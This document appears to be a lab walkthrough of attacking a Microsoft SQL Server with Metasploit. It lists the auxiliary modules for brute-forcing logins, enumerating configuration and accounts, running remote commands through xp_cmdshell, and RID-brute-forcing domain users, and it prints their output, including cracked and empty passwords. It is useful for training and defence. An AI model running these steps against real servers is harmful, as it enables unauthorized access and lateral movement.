# MSSQL Metasploit

1. Discover valid users and their passwords

In order to brute force valid users and passwords, we can use the auxiliary modules `scanner/mssql/mssql_login`. Remember to set pass_file and user_file.

result:

[+] 10.3.25.195:1433      - 10.3.25.195:1433 - Login Successful: WORKSTATION\sa:
[+] 10.3.25.195:1433      - 10.3.25.195:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
[+] 10.3.25.195:1433      - 10.3.25.195:1433 - Login Successful: WORKSTATION\auditor:nikita

2. Enumerate MSSQL configuration

We can enumerate much information from mssql running the auxiliary module `admin/mssql/mssql_enum`. When we run this module we get the following:

[*] 10.3.25.195:1433 - Configuration Parameters:
[*] 10.3.25.195:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.3.25.195:1433 - 	xp_cmdshell is Enabled
[*] 10.3.25.195:1433 - 	remote access is Enabled
[*] 10.3.25.195:1433 - 	allow updates is Not Enabled
[*] 10.3.25.195:1433 - 	Database Mail XPs is Not Enabled
[*] 10.3.25.195:1433 - 	Ole Automation Procedures are Not Enabled
[*] 10.3.25.195:1433 - Databases on the server:
[*] 10.3.25.195:1433 - 	Database name:master
[*] 10.3.25.195:1433 - 	Database Files for master:
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\master.mdf
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
[*] 10.3.25.195:1433 - 	Database name:tempdb
[*] 10.3.25.195:1433 - 	Database Files for tempdb:
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\tempdb.mdf
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\templog.ldf
[*] 10.3.25.195:1433 - 	Database name:model
[*] 10.3.25.195:1433 - 	Database Files for model:
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\model.mdf
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\modellog.ldf
[*] 10.3.25.195:1433 - 	Database name:msdb
[*] 10.3.25.195:1433 - 	Database Files for msdb:
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
[*] 10.3.25.195:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
[*] 10.3.25.195:1433 - System Logins on this Server:
[*] 10.3.25.195:1433 - 	sa
[*] 10.3.25.195:1433 - 	##MS_SQLResourceSigningCertificate##
[*] 10.3.25.195:1433 - 	##MS_SQLReplicationSigningCertificate##
[*] 10.3.25.195:1433 - 	##MS_SQLAuthenticatorCertificate##
[*] 10.3.25.195:1433 - 	##MS_PolicySigningCertificate##
[*] 10.3.25.195:1433 - 	##MS_SmoExtendedSigningCertificate##
[*] 10.3.25.195:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.3.25.195:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.3.25.195:1433 - 	##MS_AgentSigningCertificate##
[*] 10.3.25.195:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.3.25.195:1433 - 	NT SERVICE\SQLWriter
[*] 10.3.25.195:1433 - 	NT SERVICE\Winmgmt
[*] 10.3.25.195:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.3.25.195:1433 - 	BUILTIN\Users
[*] 10.3.25.195:1433 - 	NT AUTHORITY\SYSTEM
[*] 10.3.25.195:1433 - 	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.3.25.195:1433 - 	dbadmin
[*] 10.3.25.195:1433 - 	auditor
[*] 10.3.25.195:1433 - 	admin
[*] 10.3.25.195:1433 - Disabled Accounts:
[*] 10.3.25.195:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.3.25.195:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.3.25.195:1433 - No Accounts Policy is set for:
[*] 10.3.25.195:1433 - 	sa
[*] 10.3.25.195:1433 - 	dbadmin
[*] 10.3.25.195:1433 - 	auditor
[*] 10.3.25.195:1433 - 	admin
[*] 10.3.25.195:1433 - Password Expiration is not checked for:
[*] 10.3.25.195:1433 - 	sa
[*] 10.3.25.195:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.3.25.195:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.3.25.195:1433 - 	dbadmin
[*] 10.3.25.195:1433 - 	auditor
[*] 10.3.25.195:1433 - 	admin
[*] 10.3.25.195:1433 - System Admin Logins on this Server:
[*] 10.3.25.195:1433 - 	sa
[*] 10.3.25.195:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.3.25.195:1433 - 	NT SERVICE\SQLWriter
[*] 10.3.25.195:1433 - 	NT SERVICE\Winmgmt
[*] 10.3.25.195:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.3.25.195:1433 - Windows Logins on this Server:
[*] 10.3.25.195:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.3.25.195:1433 - 	NT SERVICE\SQLWriter
[*] 10.3.25.195:1433 - 	NT SERVICE\Winmgmt
[*] 10.3.25.195:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.3.25.195:1433 - 	NT AUTHORITY\SYSTEM
[*] 10.3.25.195:1433 - 	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.3.25.195:1433 - Windows Groups that can logins on this Server:
[*] 10.3.25.195:1433 - 	BUILTIN\Users
[*] 10.3.25.195:1433 - Accounts with Username and Password being the same:
[*] 10.3.25.195:1433 - 	No Account with its password being the same as its username was found.
[*] 10.3.25.195:1433 - Accounts with empty password:
[*] 10.3.25.195:1433 - 	sa
[*] 10.3.25.195:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.3.25.195:1433 - 	sp_replsetsyncstatus
[*] 10.3.25.195:1433 - 	sp_replcounters
[*] 10.3.25.195:1433 - 	sp_replsendtoqueue
[*] 10.3.25.195:1433 - 	sp_resyncexecutesql
[*] 10.3.25.195:1433 - 	sp_prepexecrpc
[*] 10.3.25.195:1433 - 	sp_repltrans
[*] 10.3.25.195:1433 - 	sp_xml_preparedocument
[*] 10.3.25.195:1433 - 	xp_qv
[*] 10.3.25.195:1433 - 	xp_getnetname
[*] 10.3.25.195:1433 - 	sp_releaseschemalock
[*] 10.3.25.195:1433 - 	sp_refreshview
[*] 10.3.25.195:1433 - 	sp_replcmds
[*] 10.3.25.195:1433 - 	sp_unprepare
[*] 10.3.25.195:1433 - 	sp_resyncprepare
[*] 10.3.25.195:1433 - 	sp_createorphan
[*] 10.3.25.195:1433 - 	xp_dirtree
[*] 10.3.25.195:1433 - 	sp_replwritetovarbin
[*] 10.3.25.195:1433 - 	sp_replsetoriginator
[*] 10.3.25.195:1433 - 	sp_xml_removedocument
[*] 10.3.25.195:1433 - 	sp_repldone
[*] 10.3.25.195:1433 - 	sp_reset_connection
[*] 10.3.25.195:1433 - 	xp_fileexist
[*] 10.3.25.195:1433 - 	xp_fixeddrives
[*] 10.3.25.195:1433 - 	sp_getschemalock
[*] 10.3.25.195:1433 - 	sp_prepexec
[*] 10.3.25.195:1433 - 	xp_revokelogin
[*] 10.3.25.195:1433 - 	sp_execute_external_script
[*] 10.3.25.195:1433 - 	sp_resyncuniquetable
[*] 10.3.25.195:1433 - 	sp_replflush
[*] 10.3.25.195:1433 - 	sp_resyncexecute
[*] 10.3.25.195:1433 - 	xp_grantlogin
[*] 10.3.25.195:1433 - 	sp_droporphans
[*] 10.3.25.195:1433 - 	xp_regread
[*] 10.3.25.195:1433 - 	sp_getbindtoken
[*] 10.3.25.195:1433 - 	sp_replincrementlsn
[*] 10.3.25.195:1433 - Instances found on this server:
[*] 10.3.25.195:1433 - 	SQLEXPRESS
[*] 10.3.25.195:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.3.25.195:1433 - 	xp_regread might be disabled in this system

3. Enumerate all MSSQL logins

To enumerate all MSSQL logins we can use the auxiliary module `admin/mssql/mssql_enum_sql_logins`. We get the following result:

[*] 10.3.25.195:1433 - Attempting to connect to the database server at 10.3.25.195:1433 as sa...
[+] 10.3.25.195:1433 - Connected.
[*] 10.3.25.195:1433 - Checking if sa has the sysadmin role...
[+] 10.3.25.195:1433 - sa is a sysadmin.
[*] 10.3.25.195:1433 - Setup to fuzz 300 SQL Server logins.
[*] 10.3.25.195:1433 - Enumerating logins...
[+] 10.3.25.195:1433 - 38 initial SQL Server logins were found.
[*] 10.3.25.195:1433 - Verifying the SQL Server logins...
[+] 10.3.25.195:1433 - 16 SQL Server logins were verified:
[*] 10.3.25.195:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 10.3.25.195:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 10.3.25.195:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 10.3.25.195:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 10.3.25.195:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 10.3.25.195:1433 -  - BUILTIN\Users
[*] 10.3.25.195:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.3.25.195:1433 -  - NT AUTHORITY\SYSTEM
[*] 10.3.25.195:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.3.25.195:1433 -  - NT SERVICE\SQLWriter
[*] 10.3.25.195:1433 -  - NT SERVICE\Winmgmt
[*] 10.3.25.195:1433 -  - NT Service\MSSQL$SQLEXPRESS
[*] 10.3.25.195:1433 -  - admin
[*] 10.3.25.195:1433 -  - auditor
[*] 10.3.25.195:1433 -  - dbadmin
[*] 10.3.25.195:1433 -  - sa

4. Execute a command on the target machine

To execute remote cmd scripts, we can use the auxiliary module `admin/mssql/mssql_exec`. Just remember to set the cmd parameter with the script you want to run there.

Running cmd `whoami`, we get the following result: 

output
 ------
 nt service\mssql$sqlexpress

5. Enumerate all available system users

To enumerate all available system users, we can run the auxiliary module `admin/mssql/mssql_enum_domain_accounts`. Running the module we get the following output:

[*] 10.3.25.195:1433 - Attempting to connect to the database server at 10.3.25.195:1433 as sa...
[+] 10.3.25.195:1433 - Connected.
[*] 10.3.25.195:1433 - SQL Server Name: EC2AMAZ-5861GL6
[*] 10.3.25.195:1433 - Domain Name: CONTOSO
[+] 10.3.25.195:1433 - Found the domain sid: 010500000000000515000000cf4b5eb619bca0ed968e21ef
[*] 10.3.25.195:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.3.25.195:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.3.25.195:1433 -  - CONTOSO\Guest
[*] 10.3.25.195:1433 -  - CONTOSO\krbtgt
[*] 10.3.25.195:1433 -  - CONTOSO\DefaultAccount
[*] 10.3.25.195:1433 -  - CONTOSO\Domain Admins
[*] 10.3.25.195:1433 -  - CONTOSO\Domain Users
[*] 10.3.25.195:1433 -  - CONTOSO\Domain Guests
[*] 10.3.25.195:1433 -  - CONTOSO\Domain Computers
[*] 10.3.25.195:1433 -  - CONTOSO\Domain Controllers
[*] 10.3.25.195:1433 -  - CONTOSO\Cert Publishers
[*] 10.3.25.195:1433 -  - CONTOSO\Schema Admins
[*] 10.3.25.195:1433 -  - CONTOSO\Enterprise Admins
[*] 10.3.25.195:1433 -  - CONTOSO\Group Policy Creator Owners
[*] 10.3.25.195:1433 -  - CONTOSO\Read-only Domain Controllers
[*] 10.3.25.195:1433 -  - CONTOSO\Cloneable Domain Controllers
[*] 10.3.25.195:1433 -  - CONTOSO\Protected Users
[*] 10.3.25.195:1433 -  - CONTOSO\Key Admins
[*] 10.3.25.195:1433 -  - CONTOSO\Enterprise Key Admins
[*] 10.3.25.195:1433 -  - CONTOSO\RAS and IAS Servers
[*] 10.3.25.195:1433 -  - CONTOSO\Allowed RODC Password Replication Group
[*] 10.3.25.195:1433 -  - CONTOSO\Denied RODC Password Replication Group
[*] 10.3.25.195:1433 -  - CONTOSO\SQLServer2005SQLBrowserUser$EC2AMAZ-5861GL6
[*] 10.3.25.195:1433 -  - CONTOSO\MSSQL-SERVER$
[*] 10.3.25.195:1433 -  - CONTOSO\DnsAdmins
[*] 10.3.25.195:1433 -  - CONTOSO\DnsUpdateProxy
[*] 10.3.25.195:1433 -  - CONTOSO\alice
[*] 10.3.25.195:1433 -  - CONTOSO\bob
[*] 10.3.25.195:1433 -  - CONTOSO\sysadmin
[+] 10.3.25.195:1433 - 29 user accounts, groups, and computer accounts were found.
[*] 10.3.25.195:1433 - Query results have been saved to: /root/.msf4/loot/20231016002712_default_10.3.25.195_mssql.domain.acc_377228.txt
